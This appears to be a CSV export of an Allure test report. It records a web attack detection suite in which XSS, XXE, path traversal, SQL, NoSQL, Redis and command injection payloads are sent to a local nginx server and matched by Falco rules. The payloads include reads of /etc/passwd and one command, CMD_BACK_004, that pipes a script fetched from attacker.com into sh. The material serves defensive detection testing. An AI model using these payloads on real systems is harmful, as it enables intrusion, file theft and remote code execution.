"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_009` |
| **Name** | Window.open DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `window.open('javascript:alert(""DOM"")')`
- **Encoded**: `window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 13:54:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1770818050431-3frvva pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1770818050431-3frvva pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:10.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1770818050431-3frvva pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[153_XSS_DOM_009]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XXE_NETDOC_001` |
| **Name** | XXE netdoc protocol file access |
| **Category** | XXE |
| **Subcategory** | protocol_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `<!ENTITY xxe SYSTEM ""netdoc:///etc/passwd"">`
- **Encoded**: `%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~51000ms
- **Timestamp**: 13:54:21.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1770818061897-7zx1n pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1770818061897-7zx1n pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1

**Falco Log Entry**:
```
13:54:21.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=XXE_NETDOC_001-1770818061897-7zx1n pattern_id=XXE_NETDOC_001 uri=/?q=%3C%21ENTITY%20xxe%20SYSTEM%20%22netdoc%3A%2F%2F%2Fetc%2Fpasswd%22%3E client=127.0.0.1
```","1","test_e2e_with_logs[454_XXE_NETDOC_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_002` |
| **Name** | Semicolon traversal variant |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..;/`
- **Encoded**: `..%3B%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 13:54:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Advanced path traversal attempt detected` |
| **Matched Rule** | `[NGINX Traversal] Advanced path traversal attempt detected test_id=PATH_ADV_002-1770818055930-frfu8j pattern_id=PATH_ADV_002 uri=/?q=..%3B%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Advanced path traversal attempt detected test_id=PATH_ADV_002-1770818055930-frfu8j pattern_id=PATH_ADV_002 uri=/?q=..%3B%2F client=127.0.0.1

**Falco Log Entry**:
```
13:54:15.000000000: Warning [NGINX Traversal] Advanced path traversal attempt detected test_id=PATH_ADV_002-1770818055930-frfu8j pattern_id=PATH_ADV_002 uri=/?q=..%3B%2F client=127.0.0.1
```","1","test_e2e_with_logs[216_PATH_ADV_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_005` |
| **Name** | Password file access attempt |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; cat /etc/passwd`
- **Encoded**: `%3B%20cat%20/etc/passwd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~67000ms
- **Timestamp**: 13:54:05.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1770818045391-q5ijs4 pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1770818045391-q5ijs4 pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1

**Falco Log Entry**:
```
13:54:05.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_005-1770818045391-q5ijs4 pattern_id=CMD_BASIC_005 uri=/?q=%3B%20cat%20/etc/passwd client=127.0.0.1
```","2","test_e2e_with_logs[304_CMD_BASIC_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_013` |
| **Name** | Function-based boolean test |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' OR LENGTH('a')=1 --`
- **Encoded**: `'%20OR%20LENGTH('a')%3D1%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 13:54:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_013-1770818062973-ftbf5s pattern_id=SQLI_BOOL_013 uri=/?q='%20OR%20LENGTH('a')%3D1%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_013-1770818062973-ftbf5s pattern_id=SQLI_BOOL_013 uri=/?q='%20OR%20LENGTH('a')%3D1%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:22.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_013-1770818062973-ftbf5s pattern_id=SQLI_BOOL_013 uri=/?q='%20OR%20LENGTH('a')%3D1%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[044_SQLI_BOOL_013]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_MONGO_008` |
| **Name** | MongoDB Regex Injection |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | mongodb |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `{""$regex"":""^admin""}`
- **Encoded**: `%7B%22%24regex%22%3A%22%5Eadmin%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 13:54:41.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_008-1770818081902-v0ssii9 pattern_id=NOSQL_MONGO_008 uri=/?q=%7B%22%24regex%22%3A%22%5Eadmin%22%7D client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_008-1770818081902-v0ssii9 pattern_id=NOSQL_MONGO_008 uri=/?q=%7B%22%24regex%22%3A%22%5Eadmin%22%7D client=127.0.0.1

**Falco Log Entry**:
```
13:54:41.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_MONGO_008-1770818081902-v0ssii9 pattern_id=NOSQL_MONGO_008 uri=/?q=%7B%22%24regex%22%3A%22%5Eadmin%22%7D client=127.0.0.1
```","1","test_e2e_with_logs[451_NOSQL_MONGO_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_REDIS_002` |
| **Name** | Redis configuration disclosure |
| **Category** | NOSQL |
| **Subcategory** | redis |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `CONFIG GET *`
- **Encoded**: `CONFIG%20GET%20%2A`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 13:54:44.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] Redis command injection` |
| **Matched Rule** | `[NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1770818084409-84hv6j pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1770818084409-84hv6j pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1

**Falco Log Entry**:
```
13:54:44.000000000: Critical [NGINX Emerging Threat] Redis command injection test_id=EMRG_REDIS_002-1770818084409-84hv6j pattern_id=EMRG_REDIS_002 uri=/?q=CONFIG%20GET%20%2A client=127.0.0.1
```","1","test_e2e_with_logs[463_EMRG_REDIS_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_BASIC_001` |
| **Name** | Basic parent directory traversal |
| **Category** | PATH |
| **Subcategory** | basic_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../`
- **Encoded**: `../`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~74000ms
- **Timestamp**: 13:53:58.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_001-1770818038388-rk0umn pattern_id=PATH_BASIC_001 uri=/?q=../ client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_001-1770818038388-rk0umn pattern_id=PATH_BASIC_001 uri=/?q=../ client=127.0.0.1

**Falco Log Entry**:
```
13:53:58.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_001-1770818038388-rk0umn pattern_id=PATH_BASIC_001 uri=/?q=../ client=127.0.0.1
```","2","test_e2e_with_logs[229_PATH_BASIC_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_065` |
| **Name** | JavaScript Protocol Handler |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `javascript:alert(1)`
- **Encoded**: `javascript%3Aalert%281%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~47000ms
- **Timestamp**: 13:54:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1770818065469-kq3s3 pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1770818065469-kq3s3 pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:25.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_065-1770818065469-kq3s3 pattern_id=XSS_ADV_065 uri=/?q=javascript%3Aalert%281%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[133_XSS_ADV_065]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_091` |
| **Name** | PostgreSQL pg_sleep |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `pg_sleep(5)`
- **Encoded**: `pg_sleep%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 13:54:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ADV_091-1770818073496-r6a6sb pattern_id=SQLI_ADV_091 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ADV_091-1770818073496-r6a6sb pattern_id=SQLI_ADV_091 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:33.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_ADV_091-1770818073496-r6a6sb pattern_id=SQLI_ADV_091 uri=/?q=pg_sleep%285%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[017_SQLI_ADV_091]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_MUT_008` |
| **Name** | Video tag XSS |
| **Category** | XSS |
| **Subcategory** | mutation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<video src=x onerror=alert('XSS')>`
- **Encoded**: `%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~40000ms
- **Timestamp**: 13:54:32.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1770818072486-guhrns pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1770818072486-guhrns pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:32.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_MUT_008-1770818072486-guhrns pattern_id=XSS_MUT_008 uri=/?q=%3Cvideo%20src%3Dx%20onerror%3Dalert('XSS')%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[173_XSS_MUT_008]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_POLY_003` |
| **Name** | Multi-database time delay polyglot |
| **Category** | SQLI |
| **Subcategory** | polyglot |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1';WAITFOR DELAY '0:0:30'--`
- **Encoded**: `1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~36000ms
- **Timestamp**: 13:54:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_POLY_003-1770818076002-pqp7hb pattern_id=SQLI_POLY_003 uri=/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_POLY_003-1770818076002-pqp7hb pattern_id=SQLI_POLY_003 uri=/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:36.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_POLY_003-1770818076002-pqp7hb pattern_id=SQLI_POLY_003 uri=/?q=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A30%27-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[087_SQLI_POLY_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_COUCH_003` |
| **Name** | CouchDB users database enumeration |
| **Category** | NOSQL |
| **Subcategory** | couchdb |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `_users/_all_docs`
- **Encoded**: `_users%2F_all_docs`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~29000ms
- **Timestamp**: 13:54:43.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection` |
| **Matched Rule** | `[NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_COUCH_003-1770818083406-z8kpf pattern_id=EMRG_COUCH_003 uri=/?q=_users%2F_all_docs client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_COUCH_003-1770818083406-z8kpf pattern_id=EMRG_COUCH_003 uri=/?q=_users%2F_all_docs client=127.0.0.1

**Falco Log Entry**:
```
13:54:43.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_COUCH_003-1770818083406-z8kpf pattern_id=EMRG_COUCH_003 uri=/?q=_users%2F_all_docs client=127.0.0.1
```","1","test_e2e_with_logs[405_EMRG_COUCH_003]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_016` |
| **Name** | Onclick event handler DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_based |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `onclick=alert('DOM')`
- **Encoded**: `onclick%3Dalert%28%27DOM%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~46000ms
- **Timestamp**: 13:54:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] Polyglot XSS Attack` |
| **Matched Rule** | `[NGINX XSS] Polyglot XSS Attack test_id=XSS_DOM_016-1770818066472-b40auk pattern_id=XSS_DOM_016 uri=/?q=onclick%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] Polyglot XSS Attack test_id=XSS_DOM_016-1770818066472-b40auk pattern_id=XSS_DOM_016 uri=/?q=onclick%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:26.000000000: Critical [NGINX XSS] Polyglot XSS Attack test_id=XSS_DOM_016-1770818066472-b40auk pattern_id=XSS_DOM_016 uri=/?q=onclick%3Dalert%28%27DOM%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[160_XSS_DOM_016]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `OTHER_API_001` |
| **Name** | API path traversal attack |
| **Category** | OTHER |
| **Subcategory** | api_abuse |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `/api/v1/users/../../../etc/passwd`
- **Encoded**: `%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~62000ms
- **Timestamp**: 13:54:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=OTHER_API_001-1770818050894-fpiusi pattern_id=OTHER_API_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=OTHER_API_001-1770818050894-fpiusi pattern_id=OTHER_API_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
13:54:10.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=OTHER_API_001-1770818050894-fpiusi pattern_id=OTHER_API_001 uri=/?q=%2Fapi%2Fv1%2Fusers%2F..%2F..%2F..%2Fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[368_OTHER_API_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BACK_004` |
| **Name** | Remote script execution via backticks |
| **Category** | CMDI |
| **Subcategory** | backtick |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: ``curl -s http://attacker.com | sh``
- **Encoded**: `%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 13:54:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern` |
| **Matched Rule** | `[NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1770818077977-0pz1ha pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1770818077977-0pz1ha pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:54:37.000000000: Warning [NGINX SQLi] Encoded SQL Injection Pattern test_id=CMD_BACK_004-1770818077977-0pz1ha pattern_id=CMD_BACK_004 uri=/?q=%60curl%20-s%20http%3A%2F%2Fattacker.com%20%7C%20sh%60 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[294_CMD_BACK_004]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_WIN_001` |
| **Name** | Windows backslash traversal |
| **Category** | PATH |
| **Subcategory** | windows_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\`
- **Encoded**: `..%5C`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~59000ms
- **Timestamp**: 13:54:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_001-1770818053423-oa6bsx pattern_id=PATH_WIN_001 uri=/?q=..%5C client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_001-1770818053423-oa6bsx pattern_id=PATH_WIN_001 uri=/?q=..%5C client=127.0.0.1

**Falco Log Entry**:
```
13:54:13.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_WIN_001-1770818053423-oa6bsx pattern_id=PATH_WIN_001 uri=/?q=..%5C client=127.0.0.1
```","1","test_e2e_with_logs[274_PATH_WIN_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
